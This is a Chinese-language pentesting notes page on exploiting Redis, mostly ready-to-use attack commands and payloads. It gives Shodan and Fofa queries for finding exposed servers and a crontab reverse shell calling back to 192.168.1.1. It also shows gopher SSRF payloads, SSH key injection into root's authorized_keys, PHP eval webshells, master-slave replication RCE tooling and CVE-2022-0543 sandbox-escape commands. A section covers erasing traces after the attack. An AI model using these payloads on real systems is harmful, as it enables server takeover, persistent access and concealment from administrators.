# Redis

> shodan : "product:Redis"
> shodan : product:"Redis key-value store"
> fofa : protocol="redis"

**Redis 基础**
- [Redis](../../../../Integrated/数据库/笔记/Redis.md)

**相关文章**
- [细数 redis 的几种 getshell 方法](http://b1ue.cn/archives/318.html)
- [Redis 常见漏洞利用方法总结](https://mp.weixin.qq.com/s/JMGD-xUwu6bw9Uh7IKcl1A)
- [【创宇小课堂】渗透测试-Redis未授权访问漏洞利用](https://mp.weixin.qq.com/s/SG_5lXOFa0QSxdCUZVI9QQ)

**相关工具**
- [yuyan-sec/RedisEXP](https://github.com/yuyan-sec/RedisEXP) - Redis 漏洞利用工具

---

## 未授权访问漏洞

**描述**

Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 `/root/.ssh` 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。

**相关文章**
- [redis未授权访问漏洞利用总结](https://p0sec.net/index.php/archives/69/)
- [Redis 未授权访问漏洞利用分析](https://hellohxk.com/blog/redis-unauthorized-vulnerability/)
- [redis未授权访问与ssrf利用](https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/)
- [Hackredis Enhanced Edition Script](https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341)

**搭建环境**
```bash
wget http://download.redis.io/releases/redis-3.2.0.tar.gz
tar xzf redis-3.2.0.tar.gz
cd redis-3.2.0 && make
```
```vim
vim redis.conf

# bind 127.0.0.1
protected-mode no
```
```bash
./src/redis-server redis.conf
```

或

```
bash f8x-dev -redis
```

测试
```bash
redis-cli -h <目标IP>
> info   # 查看 redis 版本信息、一些具体信息、服务器版本信息等等:
> CONFIG GET dir # 获取默认的 redis 目录
> CONFIG GET dbfilename # 获取默认的 rdb 文件名
```

**利用计划任务执行命令反弹 shell**

在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell 先在自己的服务器上监听一个端口 `nc -lvnp 4444` 然后执行命令:
```bash
config set dir /var/spool/cron
config set dbfilename root
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.1.1/4444 0>&1\n\n"
save
```

gopher payload
```
curl -v "gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0a1%0d%0a\$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >&/dev/tcp/192.168.1.1/8888>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$4%0d%0aroot%0d%0a*1%0d%0a\$4%0d%0asave%0d%0aquit%0d%0a"
```

**写 ssh-keygen 公钥然后使用私钥登录**

在以下条件下,可以利用此方法
1. Redis 服务使用 ROOT 账号启动
2. 服务器开放了 SSH 服务,而且允许使用密钥登录,即可远程写入一个公钥,直接登录远程服务器.

首先在本地生成一对密钥
```bash
ssh-keygen -t rsa
```

然后执行命令:
```bash
# 将公钥的内容写到一个文本中命令如下
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt

# 将里面的内容写入远程的 Redis 服务器上并且设置其 Key 为 test命令如下
cat test.txt | redis -cli -h <hostname> -x set test
redis-cli -h <hostname>
keys *
get test
config set dir "/root/.ssh"
config set dbfilename "authorized_keys"
save
```
保存后可以直接利用公钥登录 ssh

如果报错 `(error) ERR Changing directory: No such file or directory` 可能是因为 root 从来没有登录过

**往 web 物理路径写 webshell**

当 redis 权限不高时,并且服务器开着 web 服务,在 redis 有 web 目录写权限时,可以尝试往 web 路径写 webshell,执行以下命令
```bash
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php phpinfo();?>"
save
```
即可将 shell 写入 web 目录(web 目录根据实际情况)

这里的第三步写入 webshell 的时候，也可以使用
```bash
set xxx "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"
```

`\r\n\r\n` 代表换行，用 redis 写入文件的话会自带一些版本信息，如果不换行的话可能会导致无法执行, 可见下图

![](../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/1.png)

gopher payload
```
gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0ax%0d%0a\$25%0d%0a%3C%3Fphp%20%40eval(%24_POST%5Bc%5D)%3B%3F%3E%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$13%0d%0a/var/www/html%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$9%0d%0ashell.php%0d%0a*1%0d%0a\$4%0d%0asave%0d%0a
```

---

## 主从复制远程代码执行漏洞

**描述**

先创建一个恶意的 Redis 服务器作为 Redis 主机 (master)，该 Redis 主机能够回应其他连接他的 Redis 从机的响应。有了恶意的 Redis 主机之后，就会远程连接目标 Redis 服务器，通过 slaveof 命令将目标 Redis 服务器设置为我们恶意 Redis 的 Redis 从机(slaver)。然后将恶意 Redis 主机上的 exp 同步到 Reids 主机上，并将 dbfilename 设置为 exp.so。最后再控制 Redis 从机（slaver）加载模块执行系统命令即可

补充 : redis 4.0.0 版本开始才支持 module load

**相关文章**
- [Redis 基于主从复制的 RCE 利用方式](https://paper.seebug.org/975/)
- [Redis主从复制RCE影响分析](https://mp.weixin.qq.com/s/YPLnYWsBMAYij7wXHVpodg) - 介绍了 redis 主从 rce 后如何恢复的方法，可以学习一下

**POC | Payload | exp**
- [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) - 该工具无法对 Redis 密码进行 Redis 认证，也就是说该工具只能在目标存在 Redis 未授权访问漏洞时使用。如果存在密码是不能使用的
    ```bash
    python3 redis-rogue-server.py --rhost rhost --lhost lhost
    ```
- [Ridter/redis-rce](https://github.com/Ridter/redis-rce)
    ```bash
    python3 redis-rce.py -r rhost -L lhost -f exp.so -a password
    ```
- [n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
- [0671/RedisModules-ExecuteCommand-for-Windows](https://github.com/0671/RedisModules-ExecuteCommand-for-Windows)
- [LoRexxar/redis-rogue-server](https://github.com/LoRexxar/redis-rogue-server)
- [No-Github/redis-rogue-server-win](https://github.com/No-Github/redis-rogue-server-win)
- [r35tart/RedisWriteFile](https://github.com/r35tart/RedisWriteFile) - 通过 Redis 主从写出无损文件
- [Dliv3/redis-rogue-server](https://github.com/Dliv3/redis-rogue-server)
- [0671/RabR](https://github.com/0671/RabR)

**搭建环境**
```bash
yum install -y tcl
wget download.redis.io/releases/redis-4.0.11.tar.gz
tar zxf redis-4.0.11.tar.gz
cd redis-4.0.11
make PREFIX=/usr/local/redis install

/usr/local/redis/bin/redis-server
```

**痕迹清除**

在攻击之前将数据库原本的配置信息进行备份，攻击完成后，清除痕迹，恢复目录和数据库文件，同时卸载，删除模块
```bash
CONFIG get *    # 获取所有的配置
CONFIG get dir   # 获取 快照文件 保存的 位置
CONFIG get dbfilename   # 获取 快照文件 的文件名
```
```bash
# 切断主从，关闭复制功能
slaveof no one
# 恢复目录
config set dir /data
# 通过 dump.rdb 文件恢复数据
config set dbfilename dump.rdb
# 删除 exp.so
system.exec 'rm ./exp.so'
# 卸载 system 模块的加载
module unload system
```

---

## Lua RCE

**相关文章**
- [在Redis中构建Lua虚拟机的稳定攻击路径](https://www.anquanke.com/post/id/151203/)

**POC | Payload | exp**
- [iSafeBlue/redis-rce](https://github.com/iSafeBlue/redis-rce)
- [QAX-A-Team/redis_lua_exploit](https://github.com/QAX-A-Team/redis_lua_exploit)

---

## CVE-2022-0543 Redis沙盒逃逸

**描述**

在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module 和 require 以及 package 的 Lua 变量存在于上游 Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而 package 并没有清除，所以导致 redis 可以加载上游的 Lua 全局变量 package 来逃逸沙箱。

**相关文章**
- [CVE-2022-0543 Redis沙盒逃逸分析](https://mp.weixin.qq.com/s/CgFT96vFfnOF4UFGvsCOyg)

**POC | Payload | exp**

需要知道 package.loadlib 的路径
```
# 利用 luaopen_os 函数
eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("touch /tmp/redis_eval"); return 0' 0

# 利用 luaopen_io 函数
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```
